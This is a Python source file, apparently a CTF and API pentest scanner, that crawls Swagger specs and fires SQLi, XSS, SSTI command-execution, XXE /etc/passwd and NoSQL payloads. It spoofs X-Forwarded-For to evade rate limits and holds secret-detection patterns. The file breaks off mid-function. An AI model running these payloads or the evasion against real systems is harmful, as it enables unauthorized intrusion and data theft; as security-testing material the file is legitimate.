#!/usr/bin/env python3
import argparse
import base64
import csv
import datetime as dt
import hashlib
import hmac
import json
import os
import re
import shlex
import subprocess
import sys
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Optional, Dict, Any, Set
from urllib.parse import urlparse

try:
    import yaml
except ImportError:
    yaml = None


# Formatos de flag: SEC_OPS{...}, flag{...}, FLAG{...}, CTF{...}
FLAG_RE = re.compile(r"(?:flag|FLAG|SEC_OPS|CTF)\{[^}\r\n]+\}")


@dataclass
class SwaggerParameter:
    """Parámetro de un endpoint Swagger"""
    name: str
    in_location: str  # "query", "path", "header", "cookie", "body"
    required: bool
    schema: Dict[str, Any]
    example: Optional[str] = None


@dataclass
class SwaggerMethod:
    """Método HTTP (GET, POST, PUT, DELETE) de un endpoint"""
    name: str  # "GET", "POST", "PUT", "DELETE"
    summary: Optional[str] = None
    parameters: List[SwaggerParameter] = field(default_factory=list)
    request_body: Optional[Dict[str, Any]] = None
    responses: Dict[int, str] = field(default_factory=dict)
    security: List[str] = field(default_factory=list)
    deprecated: bool = False


@dataclass
class SwaggerEndpoint:
    """Endpoint del Swagger con todos sus métodos y metadata"""
    path: str
    methods: Dict[str, SwaggerMethod] = field(default_factory=dict)
    global_parameters: List[SwaggerParameter] = field(default_factory=list)
    security: List[str] = field(default_factory=list)
    description: str = ""
    tags: List[str] = field(default_factory=list)


@dataclass
class ToolResult:
    name: str
    command: str
    returncode: int
    stdout: str
    stderr: str
    flags: List[str] = field(default_factory=list)
    duration_ms: float = 0.0
    status_code: int = 0


class CommandLogger:
    def __init__(self, log_file: Path):
        self.log_file = log_file
        self.commands = []
    
    def log_command(self, cmd: str, returncode: int, duration_ms: float, status_http: str = "", redirect_to: str = ""):
        timestamp = dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        redirect_info = f" (redirect: {redirect_to})" if redirect_to else ""
        entry = f"[{timestamp}] {cmd} → {status_http} ({duration_ms:.0f}ms){redirect_info}"
        self.commands.append(entry)
        self.log_file.write_text("\n".join(self.commands) + "\n", encoding="utf-8")


class RedirectTracker:
    def __init__(self):
        self.redirects = []
        self._seen_initial_urls = set()
    
    def track_redirect(self, initial_url: str, response_text: str) -> Dict:
        """Extrae redirects del response HTTP (deduplicado)"""
        # Evitar duplicados
        if initial_url in self._seen_initial_urls:
            return {}
        self._seen_initial_urls.add(initial_url)
        
        lines = response_text.split('\n')
        chain = []
        current_url = initial_url
        
        for line in lines:
            line_lower = line.lower()
            if 'http/' in line_lower and (' 301 ' in line or ' 302 ' in line or ' 303 ' in line):
                status = line.split()[1] if len(line.split()) > 1 else "unknown"
                chain.append({"url": current_url, "status": int(status)})
            
            if line_lower.startswith('location:'):
                next_url = line.split(':', 1)[1].strip()
                current_url = next_url
        
        if chain:
            chain.append({"url": current_url, "status": 200})
            redirect_obj = {
                "initial_url": initial_url,
                "chain": chain,
                "final_url": current_url,
                "final_status": 200
            }
            self.redirects.append(redirect_obj)
            return redirect_obj
        
        return {}
    
    def save_redirects(self, output_file: Path):
        data = {"redirects": self.redirects, "total_redirects": len(self.redirects)}
        output_file.write_text(json.dumps(data, indent=2), encoding="utf-8")


class DocDiscoveryLogger:
    def __init__(self):
        self.docs = []
    
    def log_doc(self, path: str, full_url: str, status: int, content_type: str, found: bool):
        doc = {
            "path": path,
            "full_url": full_url,
            "status": status,
            "content_type": content_type,
            "found": found,
            "attempt_timestamp": dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        }
        self.docs.append(doc)
    
    def save_docs(self, output_file: Path):
        # Ordenar: primero válidos (200-204, 301-302), luego 404s, luego otros
        valid_statuses = [200, 201, 202, 204, 301, 302, 303]
        valid_docs = [d for d in self.docs if d["status"] in valid_statuses]
        not_found_docs = [d for d in self.docs if d["status"] == 404]
        other_docs = [d for d in self.docs if d["status"] not in valid_statuses and d["status"] != 404]
        
        sorted_docs = valid_docs + not_found_docs + other_docs
        data = {
            "documentation": sorted_docs,
            "total_paths_tested": len(self.docs),
            "docs_found": sum(1 for d in self.docs if d["found"]),
            "valid_endpoints": len(valid_docs),
            "not_found_endpoints": len(not_found_docs)
        }
        output_file.write_text(json.dumps(data, indent=2), encoding="utf-8")


class AttackMatrixBuilder:
    def __init__(self, csv_file: Path):
        self.csv_file = csv_file
        self.attacks = []
        self.write_header()
    
    def write_header(self):
        with open(self.csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['endpoint', 'method', 'payload', 'status', 'response_time_ms', 'flags_found', 'response_preview_first_200_chars'])
    
    def add_attack(self, endpoint: str, method: str, payload: Any, status: int, duration_ms: float, flags: List[str], response_preview: str):
        payload_str = json.dumps(payload) if isinstance(payload, dict) else str(payload)
        flags_str = ", ".join(flags) if flags else "none"
        preview = response_preview[:200].replace('\n', ' ').replace('"', '""')
        
        row = [endpoint, method, payload_str, status, f"{duration_ms:.1f}", flags_str, preview]
        self.attacks.append(row)
        
        with open(self.csv_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(row)


class ResponseCacher:
    def __init__(self, cache_dir: Path, max_responses: int = 300):
        self.cache_dir = cache_dir
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        self.max_responses = max_responses
        self.response_count = 0
        self.cached_responses = []
    
    def save_response(self, endpoint: str, method: str, status: int, response_full: str) -> Optional[str]:
        if self.response_count >= self.max_responses:
            return None
        
        # Sanitizar nombre de archivo
        endpoint_safe = re.sub(r'[^a-zA-Z0-9_\-]', '_', endpoint)[:50]
        filename = f"{method}_{endpoint_safe}_{status}.txt"
        filepath = self.cache_dir / filename
        
        filepath.write_text(response_full, encoding='utf-8', errors='ignore')
        self.response_count += 1
        self.cached_responses.append(str(filepath.relative_to(self.cache_dir.parent)))
        
        return filename


class ResponseAnalyzer:
    """Analiza respuestas HTTP en busca de indicadores de vulnerabilidad"""
    
    PATTERNS: Dict[str, List[str]] = {
        "sql_error": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"PostgreSQL.*ERROR",
            r"ORA-[0-9]{5}",
            r"DRIVER=\{PostgreSQL\}",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB",
            r"SQLite/JDBCDriver",
            r"psql: ERROR:",
            r"SQLSTATE\[",
            r"you have an error in your sql syntax",
            r"division by zero.*SQL",
            r"unknown column",
            r"duplicate entry",
        ],
        "stack_trace": [
            r"Traceback \(most recent call last\)",
            r"\s+at\s+[\w\.]+\([\w\.]+\.java:\d+\)",
            r"File \".*?\", line \d+",
            r"in <module>",
            r"--- \[[\w]+\] ---",
            r"Exception in thread",
            r"Caused by:",
            r"PHP Fatal error",
            r"PHP Warning",
            r"Fatal error:",
            r"Parse error:",
            r"Warning:.*unexpected",
        ],
        "sensitive_data": [
            r"(?i)api[_-]?key['\"\s]*[:=]['\"\s]*[A-Za-z0-9_\-]{16,}",
            r"(?i)secret['\"\s]*[:=]['\"\s]*[A-Za-z0-9_\-]{8,}",
            r"(?i)token['\"\s]*[:=]['\"\s]*[A-Za-z0-9_\-\.]{10,}",
            r"-----BEGIN (RSA |OPENSSH )?PRIVATE KEY-----",
            r"(?i)aws_secret",
            r"(?i)password['\"\s]*[:=]['\"\s]*['\"][A-Za-z0-9!@#$%^&*()_+\-=\[\]{}|;:',.<>/?]+['\"]",
            r"(?i)jwt['\"\s]*[:=]['\"\s]*['\"][A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+['\"]",
            r"(?i)access_token",
            r"(?i)refresh_token",
            r"(?i)aws_access_key",
            r"(?i)secret_access_key",
        ],
        "version_leak": [
            r"Server: (.+)",
            r"X-Powered-By: (.+)",
            r"X-AspNet-Version: (.+)",
            r"X-Runtime: (.+)",
            r"X-Version: (.+)",
            r"X-Generator: (.+)",
            r"X-Drupal-Cache: (.+)",
            r"X-Varnish: (.+)",
        ],
        "cors_misconfig": [
            r"Access-Control-Allow-Origin: \*",
            r"Access-Control-Allow-Credentials: true",
        ],
        "interesting_response": [
            r'"admin"\s*:\s*true',
            r'"success"\s*:\s*true',
            r'"token"\s*:\s*"[A-Za-z0-9_\-\.]{10,}"',
            r'"role"\s*:\s*"admin"',
            r'"flag"\s*:\s*"',
            r'"debug".*true',
            r'"verbose".*true',
        ],
        "debug_header": [
            r"X-Debug:",
            r"X-Debug-Info:",
            r"X-Debug-Token:",
            r"X-Request-Id:",
            r"cf-ray:",
            r"X-Cache:",
        ],
        "graphql": [
            r'"data"\s*:\s*\{',
            r'"__typename"',
            r'"schema"',
            r'"queryType"',
            r'"mutationType"',
            r'"subscriptionType"',
            r'"types"\s*:\s*\[',
        ],
        "ssrf_indicator": [
            r"(?i)root:x:0:0:",
            r"(?i)ami-id",
            r"(?i)local-ipv4",
            r"(?i)public-keys",
            r"(?i)security-credentials",
            r"(?i)iam/security-credentials",
            r"(?i)meta-data",
        ],
        "path_traversal": [
            r"root:.*:0:0:",
            r"\[drw[xr]",
            r"uid=\d+\([\w]+\)",
            r"gid=\d+\([\w]+\)",
            r"\[fonts\]",
            r"\[extensions\]",
            r"boot.ini",
            r"\[boot loader\]",
        ],
        "xxe_success": [
            r"root:x:0:0:",
            r"localhost",
            r"\[ExtShellFolderViews\]",
        ],
        "verbose_error": [
            r"Invalid argument",
            r"Undefined (variable|index|property)",
            r"Array to string conversion",
            r"Cannot modify header information",
            r"Failed to open stream",
            r"Call to undefined method",
            r"Call to undefined function",
            r"Class '.*' not found",
            r"Trying to get property of non-object",
        ],
    }

    @staticmethod
    def analyze(body: str, headers_text: str) -> List[str]:
        """Analiza body + headers y retorna lista de hallazgos"""
        findings = []
        combined = body + "\n" + headers_text
        for category, patterns in ResponseAnalyzer.PATTERNS.items():
            for pattern in patterns:
                matches = re.findall(pattern, combined, re.IGNORECASE | re.MULTILINE)
                if matches:
                    for m in matches[:2]:
                        m_str = str(m).strip()[:100]
                        finding = f"[{category}] {m_str}"
                        if finding not in findings:
                            findings.append(finding)
        return findings


@dataclass
class ScanState:
    host: str
    credentials: Optional[str]
    output_dir: Path
    started_at: str
    discovered_docs: List[str] = field(default_factory=list)
    discovered_endpoints: Set[str] = field(default_factory=set)
    valid_endpoints: Set[str] = field(default_factory=set)
    swagger_endpoints: Dict[str, SwaggerEndpoint] = field(default_factory=dict)
    swagger_mode: bool = False
    tool_results: List[ToolResult] = field(default_factory=list)
    flags: List[str] = field(default_factory=list)
    findings: List[str] = field(default_factory=list)
    payload_results: List[Dict[str, Any]] = field(default_factory=list)
    server_fingerprint: Dict[str, str] = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    graphql_schema: Optional[Dict] = None
    analysis_findings: List[str] = field(default_factory=list)


class CapipenScanner:
    def __init__(self, host: str, credentials: Optional[str], output_dir: Path,
                 swagger_url: Optional[str] = None, proxy: Optional[str] = None,
                 verbose: bool = False, concurrency: int = 5):
        self.host = self.normalize_host(host)
        self.credentials = credentials
        self.swagger_url = swagger_url
        self.proxy = proxy
        self.verbose = verbose
        self.concurrency = concurrency
        self.output_base = output_dir
        self.lock = threading.Lock()
        
        # Crear carpeta de scan con timestamp
        date_slug = re.sub(r'[^a-zA-Z0-9]+', '-', self.host.replace("https://", "").replace("http://", "")).strip("-")
        date_str = dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%d")
        self.scan_folder = output_dir / f"scan-{date_str}-{date_slug}"
        self.scan_folder.mkdir(parents=True, exist_ok=True)
        
        self.responses_dir = self.scan_folder / "responses"
        self.responses_dir.mkdir(exist_ok=True)
        
        self.state = ScanState(
            host=self.host,
            credentials=credentials,
            output_dir=self.scan_folder,
            started_at=dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        )
        
        # Inicializar loggers
        self.cmd_logger = CommandLogger(self.scan_folder / "commands.log")
        self.redirect_tracker = RedirectTracker()
        self.doc_logger = DocDiscoveryLogger()
        self.attack_matrix = AttackMatrixBuilder(self.scan_folder / "attacks-matrix.csv")
        self.response_cacher = ResponseCacher(self.responses_dir, max_responses=300)
        self.response_analyzer = ResponseAnalyzer()
        
        self.flag_regex = FLAG_RE
        self.swagger_paths = [
            "/swagger.json",
            "/swagger-ui.html",
            "/api-docs",
            "/v1/api-docs",
            "/v2/api-docs",
            "/openapi.json",
            "/openapi.yaml",
            "/openapi.yml",
            "/api/v1/swagger.json",
            "/api/",
            "/api",
        ]
        
        # Detectar rutas de wordlists (macOS vs Linux)
        macos_paths = [
            Path("~/Tools/SecLists"),
            Path("/Users/xaferima/Tools/SecLists"),
        ]
        linux_paths = [
            Path("/usr/share/wordlists/SecLists"),
            Path("/usr/share/seclists"),
        ]
        seclists_base = None
        for p in macos_paths + linux_paths:
            if p.exists():
                seclists_base = p
                break
        if seclists_base is None:
            # Fallback: usar paths originales de macOS (pueden no existir)
            seclists_base = Path("~/Tools/SecLists")
        
        self.wordlists = {
            "endpoints": str(seclists_base / "Discovery/Web-Content/api/api-endpoints.txt"),
            "parameters": str(seclists_base / "Discovery/Web-Content/burp-parameter-names.txt"),
            "methods": str(seclists_base / "Fuzzing/http-request-methods.txt"),
            "sqli": str(seclists_base / "Fuzzing/SQLi/Quick-SQLi.txt"),
        }
        self.requests_executed = 0
        self.start_time = dt.datetime.now(dt.timezone.utc)
        self._rate_limit_ip_idx = 0

    @staticmethod
    def normalize_host(host: str) -> str:
        host = host.strip()
        if host.startswith("http://") or host.startswith("https://"):
            return host.rstrip("/")
        return f"https://{host}".rstrip("/")
    
    def load_swagger_from_url(self, url: str) -> Dict[str, SwaggerEndpoint]:
        """Descarga swagger/openapi desde URL y extrae todos los endpoints con metadata completa"""
        print(f"[*] Cargando swagger desde: {url}")
        
        result = self.curl(url, timeout=15)
        if not result or result.returncode != 0:
            print(f"[-] Error descargando swagger: {url}")
            return {}
        
        body = self.extract_http_body(result.stdout)
        
        try:
            # Intentar parsear como JSON
            swagger_data = json.loads(body)
        except Exception:
            # Intentar parsear como YAML
            if yaml:
                try:
                    swagger_data = yaml.safe_load(body)
                except Exception as e:
                    print(f"[-] Error parseando swagger (ni JSON ni YAML): {e}")
                    return {}
            else:
                print("[-] No se pudo parsear swagger (instala pyyaml)")
                return {}
        
        if not isinstance(swagger_data, dict):
            print("[-] Swagger no es un objeto JSON/YAML válido")
            return {}
        
        # STEP 1: Extraer JWT del swagger si existe y no hay credenciales
        if not self.credentials:
            jwt_token = self._extract_jwt_from_swagger(swagger_data)
            if jwt_token:
                self.credentials = f"Bearer {jwt_token}"
        
        # Guardar el swagger parseado
        self.state.swagger_mode = True
        swagger_endpoints = {}
        
        # STEP 2: Extraer paths
        paths = swagger_data.get("paths", {})
        if isinstance(paths, dict):
            for path_key, path_obj in paths.items():
                if path_key and path_key not in ["/", ""]:
                    endpoint = self._parse_swagger_path(path_key, path_obj)
                    if endpoint:
                        # Agregar el path original
                        swagger_endpoints[path_key] = endpoint
                        print(f"  [+] Path: {path_key} con métodos: {list(endpoint.methods.keys())}")
                        
                        # STEP 3: Expandir trailing slashes Y parámetros de path
                        expanded_paths = self._expand_path_params(path_key)
                        for expanded_path in expanded_paths:
                            if expanded_path != path_key:
                                # Crear una copia del endpoint para la ruta expandida
                                expanded_endpoint = SwaggerEndpoint(
                                    path=expanded_path,
                                    methods={k: v for k, v in endpoint.methods.items()},
                                    global_parameters=endpoint.global_parameters.copy(),
                                    security=endpoint.security.copy(),
                                    description=endpoint.description,
                                    tags=endpoint.tags.copy()
                                )
                                swagger_endpoints[expanded_path] = expanded_endpoint
                                print(f"    [+] Expanded: {expanded_path}")
        
        print(f"[+] Total endpoints extraídos del swagger: {len(swagger_endpoints)}")
        return swagger_endpoints
    
    def _parse_swagger_path(self, path_key: str, path_obj: Dict) -> Optional[SwaggerEndpoint]:
        """Parsea un path del swagger y extrae todos sus métodos y parámetros"""
        if not isinstance(path_obj, dict):
            return None
        
        endpoint = SwaggerEndpoint(path=path_key)
        endpoint.description = path_obj.get("description", "")
        endpoint.global_parameters = self._extract_path_parameters(path_obj.get("parameters", []))
        endpoint.security = path_obj.get("security", [])
        
        # Métodos HTTP soportados
        http_methods = ["get", "post", "put", "delete", "patch", "head", "options"]
        
        for method_name in http_methods:
            if method_name in path_obj:
                method_obj = path_obj[method_name]
                swagger_method = SwaggerMethod(name=method_name.upper())
                
                # Extraer metadata del método
                swagger_method.summary = method_obj.get("summary", "")
                swagger_method.deprecated = method_obj.get("deprecated", False)
                swagger_method.security = method_obj.get("security", endpoint.security)
                
                # Extraer parámetros
                swagger_method.parameters = self._extract_path_parameters(method_obj.get("parameters", []))
                
                # Extraer request body
                if "requestBody" in method_obj:
                    request_body = method_obj["requestBody"]
                    if "content" in request_body:
                        for content_type, content in request_body["content"].items():
                            if "schema" in content:
                                swagger_method.request_body = content["schema"]
                                break
                
                # Extraer responses
                responses = method_obj.get("responses", {})
                for status_code, response_obj in responses.items():
                    if isinstance(response_obj, dict):
                        swagger_method.responses[int(status_code)] = response_obj.get("description", "")
                
                endpoint.methods[method_name.upper()] = swagger_method
        
        return endpoint if endpoint.methods else None
    
    def _extract_path_parameters(self, parameters: List) -> List[SwaggerParameter]:
        """Extrae parámetros de una lista de parámetros del swagger"""
        result = []
        if not isinstance(parameters, list):
            return result
        
        for param in parameters:
            if not isinstance(param, dict):
                continue
            
            swagger_param = SwaggerParameter(
                name=param.get("name", ""),
                in_location=param.get("in", "query"),
                required=param.get("required", False),
                schema=param.get("schema", {}),
                example=param.get("example")
            )
            result.append(swagger_param)
        
        return result
    
    def _expand_path_params(self, path: str) -> Set[str]:
        """Expande parámetros entre llaves {id} y trailing slashes"""
        expanded_paths = set()
        
        # Agregar el path original
        expanded_paths.add(path)
        
        # Expandir trailing slashes
        if path.endswith('/') and path != '/':
            path_without_slash = path.rstrip('/')
            expanded_paths.add(path_without_slash)
        
        # Detectar parámetros entre llaves
        params = re.findall(r'\{([^}]+)\}', path)
        
        if not params:
            # Sin parámetros, retornar las variantes de trailing slash
            return expanded_paths
        
        # Valores de prueba para expandir parámetros
        test_values = {
            'id': ['1', '123', 'test', 'admin'],
            'userId': ['1', '123', 'test'],
            'username': ['admin', 'test', 'user'],
            'email': ['test@test.com', 'admin@admin.com'],
            'name': ['test', 'admin'],
            'productId': ['1', '123'],
            'orderId': ['1', '123'],
        }
        
        # Expandir parámetros
        for param in params:
            # Obtener valores de prueba (usar genéricos si no están definidos)
            values = test_values.get(param, ['1', 'test', 'admin'])
            
            # Crear variantes del path reemplazando cada parámetro
            for value in values:
                expanded_path = path.replace(f"{{{param}}}", value)
                # Si hay más parámetros, recursivamente expandir
                remaining_params = re.findall(r'\{([^}]+)\}', expanded_path)
                if remaining_params:
                    sub_expanded = self._expand_path_params(expanded_path)
                    expanded_paths.update(sub_expanded)
                else:
                    expanded_paths.add(expanded_path)
                    # Si tiene trailing slash, agregar versión sin slash
                    if expanded_path.endswith('/') and expanded_path != '/':
                        expanded_paths.add(expanded_path.rstrip('/'))
        
        return expanded_paths
    
    def _extract_jwt_from_swagger(self, swagger_data: Dict) -> Optional[str]:
        """Extrae JWT embebido en la descripción del swagger si existe"""
        try:
            components = swagger_data.get("components", {})
            security_schemes = components.get("securitySchemes", {})
            
            for scheme_name, scheme_obj in security_schemes.items():
                if isinstance(scheme_obj, dict):
                    description = scheme_obj.get("description", "")
                    # Buscar token JWT (comienza con eyJ)
                    tokens = re.findall(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', description)
                    if tokens:
                        print(f"[+] JWT encontrado en swagger, aplicando automáticamente")
                        return tokens[0]
        except Exception:
            pass
        return None
    
    def _discover_graphql_endpoint(self) -> Optional[str]:
        """Descubre endpoint de GraphQL probando paths comunes"""
        graphql_paths = ['/graphql', '/api/graphql', '/graph', '/gql', '/v1/graphql', '/query']
        for path in graphql_paths:
            url = f"{self.host}{path}"
            result = self.curl(url, method="POST",
                               headers={"Content-Type": "application/json"},
                               data='{"query":"query { __typename }"}', timeout=10)
            if result and result.status_code in [200, 400]:
                body = self.extract_http_body(result.stdout) if result.stdout else ""
                if '"data"' in body or '"errors"' in body or '__typename' in body:
                    print(f"  [+] GraphQL endpoint encontrado: {path}")
                    self.state.discovered_endpoints.add(path)
                    self.state.valid_endpoints.add(path)
                    self.state.findings.append(f"GraphQL endpoint: {path}")
                    return path
        return None
    
    def _execute_graphql_introspection(self, endpoint: str) -> None:
        """Ejecuta query de introspección GraphQL"""
        full_url = f"{self.host}{endpoint}"
        introspection_query = """{"query":"query { __schema { queryType { name } mutationType { name } types { kind name fields(includeDeprecated: true) { name args { name type { name kind } } } } } }"}"""
        result = self.curl(full_url, method="POST",
                           headers={"Content-Type": "application/json"},
                           data=introspection_query, timeout=15)
        if result and result.stdout:
            body = self.extract_http_body(result.stdout)
            try:
                data = json.loads(body)
                if "data" in data and "__schema" in data["data"]:
                    self.state.graphql_schema = data["data"]
                    types = data["data"]["__schema"].get("types", [])
                    names = [t["name"] for t in types if t.get("name") and not t["name"].startswith("__")]
                    print(f"    [+] GraphQL schema: {len(names)} tipos descubiertos")
                    print(f"    [+] Tipos: {', '.join(names[:10])}")
                    self.state.findings.append(f"GraphQL introspection exitosa: {len(names)} tipos")
            except Exception:
                pass
    
    def _generate_payloads_from_schema(self, schema: Dict[str, Any], param_name: str) -> List[Any]:
        """Genera payloads de prueba basados en el schema del parámetro"""
        if not isinstance(schema, dict):
            return ["test"]
        
        param_type = schema.get("type", "string")
        enum_values = schema.get("enum", [])
        param_format = schema.get("format", "")
        
        payloads = []
        
        if enum_values:
            # Si hay valores enumerados, usar todos ellos
            payloads.extend(enum_values)
            # Agregar payloads de ataque para cada enum
            for val in enum_values:
                if isinstance(val, str):
                    payloads.append(f"{val}' OR '1'='1")
        
        if param_type == "string":
            payloads.extend([
                "test",
                param_name,
                "' OR '1'='1",
                "' OR 1=1--",
                "admin",
                "admin' --",
                "'; pg_sleep(3)--",
                "' AND SLEEP(3)--",
                "<script>alert(1)</script>",
                "${7*7}",
                "{{7*7}}",
                "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            ])
            
            if param_format == "email":
                payloads.extend([
                    "test@test.com",
                    "admin@admin.com",
                    "' OR '1'='1@test.com",
                ])
        
        elif param_type == "integer":
            payloads.extend([1, 0, -1, 999999, -999999])
        
        elif param_type == "boolean":
            payloads.extend([True, False, "true", "false", "1", "0"])
        
        elif param_type == "object":
            payloads.append({"test": "test"})
            payloads.append({"$ne": None})
        
        return payloads

    def run(self) -> Path:
        print(f"[*] Iniciando scan en {self.host}...")
        print(f"[*] Carpeta de resultados: {self.scan_folder}")
        self.validate_connectivity()
        self.discover_endpoints()
        self.execute_payloads_on_endpoints()
        report = self.generate_report_md()
        self.finalize_outputs()
        end_time = dt.datetime.now(dt.timezone.utc)
        duration = (end_time - self.start_time).total_seconds()
        print(f"[+] Escaneo completado en {duration:.1f} segundos")
        print(f"[+] Resultados en: {self.scan_folder}")
        return report

    def curl(self, url: str, method: str = "GET", headers: Optional[Dict[str, str]] = None,
             data: Optional[str] = None, timeout: int = 15) -> Optional[ToolResult]:
        
        with self.lock:
            if self.requests_executed >= 300:
                return None
            self.requests_executed += 1
        
        # Rate limit bypass: rotar X-Forwarded-For
        rate_limit_ips = ["127.0.0.1", "10.0.0.1", "192.168.1.1", "172.16.0.1", "10.10.10.10"]
        if headers is None:
            headers = {}
        if "X-Forwarded-For" not in headers:
            with self.lock:
                ip = rate_limit_ips[self._rate_limit_ip_idx % len(rate_limit_ips)]
                self._rate_limit_ip_idx += 1
            headers["X-Forwarded-For"] = ip
        
        start = time.time()
        last_error = None
        
        for attempt in range(3):
            cmd = ["curl", "-sS", "-L", "-i", "-k", "--max-time", str(timeout), "-X", method]
            if self.credentials:
                auth_value = self.credentials if self.credentials.lower().startswith("bearer ") else f"Bearer {self.credentials}"
                cmd.extend(["-H", f"Authorization: {auth_value}"])
            if self.proxy:
                cmd.extend(["--proxy", self.proxy])
            if headers:
                for key, value in headers.items():
                    cmd.extend(["-H", f"{key}: {value}"])
            if data is not None:
                cmd.extend(["--data", data])
            cmd.append(url)
            
            try:
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
                if proc.returncode == 0:
                    last_error = None
                    break
            except subprocess.TimeoutExpired:
                last_error = "timeout"
            except Exception as e:
                last_error = str(e)
            
            if attempt < 2:
                time.sleep(1)
        
        if last_error and not proc:
            return None
        
        duration_ms = (time.time() - start) * 1000
        
        stdout = proc.stdout if hasattr(proc, 'stdout') else ""
        stderr = proc.stderr if hasattr(proc, 'stderr') else ""
        
        if not stdout and not stderr:
            return None
        
        flags = self.extract_flags(stdout + "\n" + stderr)
        with self.lock:
            self.state.flags.extend([f for f in flags if f not in self.state.flags])
        
        # Extraer status HTTP
        status_line = stdout.split('\n')[0] if stdout else "Unknown"
        status_code = 0
        try:
            status_code = int(status_line.split()[1]) if len(status_line.split()) > 1 else 0
        except Exception:
            pass
        
        # Server fingerprinting
        for line in stdout.split('\n'):
            lower = line.lower()
            if lower.startswith('server:'):
                val = line.split(':', 1)[1].strip()
                with self.lock:
                    self.state.server_fingerprint['server'] = val
                    if 'gunicorn' in val.lower() or 'uvicorn' in val.lower():
                        if 'Python' not in self.state.technologies:
                            self.state.technologies.append('Python')
                            self.state.findings.append("Tecnología detectada: Python (posible SSTI)")
                    elif 'apache-coyote' in val.lower() or 'tomcat' in val.lower():
                        if 'Java' not in self.state.technologies:
                            self.state.technologies.append('Java')
                            self.state.findings.append("Tecnología detectada: Java (posible deserialización)")
            elif lower.startswith('x-powered-by:'):
                val = line.split(':', 1)[1].strip()
                with self.lock:
                    self.state.server_fingerprint['x-powered-by'] = val
                    if 'express' in val.lower():
                        if 'Node.js' not in self.state.technologies:
                            self.state.technologies.append('Node.js')
                            self.state.findings.append("Tecnología detectada: Node.js/Express (posible NoSQLi)")
        
        # Response analysis
        body = self.extract_http_body(stdout)
        analysis = ResponseAnalyzer.analyze(body, stdout)
        if analysis:
            with self.lock:
                for a in analysis:
                    if a not in self.state.analysis_findings:
                        self.state.analysis_findings.append(a)
        
        # Registrar comando
        self.cmd_logger.log_command(
            shlex.join(cmd),
            proc.returncode if hasattr(proc, 'returncode') else -1,
            duration_ms,
            status_line
        )
        
        # Detectar redirect
        redirect_to = ""
        for line in stdout.split('\n'):
            if line.lower().startswith('location:'):
                redirect_to = line.split(':', 1)[1].strip()
                break
        
        if redirect_to:
            self.redirect_tracker.track_redirect(url, stdout)
        
        # Guardar respuesta
        self.response_cacher.save_response(url.replace(self.host, ""), method, status_code, stdout)
        
        result = ToolResult(
            name="curl",
            command=shlex.join(cmd),
            returncode=proc.returncode if hasattr(proc, 'returncode') else -1,
            stdout=stdout,
            stderr=stderr,
            flags=flags,
            duration_ms=duration_ms,
            status_code=status_code,
        )
        with self.lock:
            self.state.tool_results.append(result)
        
        if self.verbose:
            print(f"    [DEBUG] {method} {url} → {status_code} ({duration_ms:.0f}ms)")
            if analysis:
                for a in analysis:
                    print(f"    [ANALYSIS] {a}")
        
        return result

    def run_cmd(self, name: str, cmd: List[str], timeout: int = 600) -> ToolResult:
        import time
        start = time.time()
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            proc = subprocess.CompletedProcess(cmd, 1, "", f"Timeout after {timeout}s")
        
        duration_ms = (time.time() - start) * 1000
        stdout = proc.stdout
        stderr = proc.stderr
        flags = self.extract_flags(stdout + "\n" + stderr)
        self.state.flags.extend([f for f in flags if f not in self.state.flags])
        
        self.cmd_logger.log_command(shlex.join(cmd), proc.returncode, duration_ms)
        
        result = ToolResult(
            name=name,
            command=shlex.join(cmd),
            returncode=proc.returncode,
            stdout=stdout,
            stderr=stderr,
            flags=flags,
            duration_ms=duration_ms,
        )
        self.state.tool_results.append(result)
        return result

    def extract_flags(self, text: str) -> List[str]:
        flags = set(self.flag_regex.findall(text))
        
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                for value in data.values():
                    if isinstance(value, str):
                        flags.update(self.flag_regex.findall(value))
        except Exception:
            pass
        
        return sorted(flags)

    def extract_http_body(self, response_text: str) -> str:
        if "\r\n\r\n" in response_text:
            return response_text.split("\r\n\r\n", 1)[-1]
        if "\n\n" in response_text:
            return response_text.split("\n\n", 1)[-1]
        return response_text

    def validate_connectivity(self) -> None:
        result = self.curl(self.host, timeout=10)
        if result and result.returncode == 0:
            print("[+] Conectividad OK")
            self.state.findings.append("Conectividad inicial OK")
        else:
            print("[-] Error de conectividad")
            self.state.findings.append("Conectividad inicial fallida")

    def _add_common_endpoints(self) -> None:
        """Agrega endpoints comunes de API al conjunto de descubiertos"""
        common = ["/api", "/api/v1", "/api/v2", "/api/v3", "/api/users", "/api/login", "/", ""]
        for ep in common:
            if ep not in self.state.discovered_endpoints:
                self.state.discovered_endpoints.add(ep)

    def discover_endpoints(self) -> None:
        print("\n[*] Fase 1: Discovery de endpoints...")
        
        # Si se proporciona swagger_url, cargarlo directamente
        if self.swagger_url:
            url = self.swagger_url
            if url.startswith("/"):
                url = f"{self.host.rstrip('/')}{url}"
                if self.verbose:
                    print(f"  [DEBUG] Resolviendo swagger URL relativa → {url}")
            swagger_endpoints = self.load_swagger_from_url(url)
            if swagger_endpoints:
                self.state.swagger_endpoints = swagger_endpoints
                self.state.discovered_docs.append(self.swagger_url)
                # Convertir a Set para consistencia
                for path in swagger_endpoints.keys():
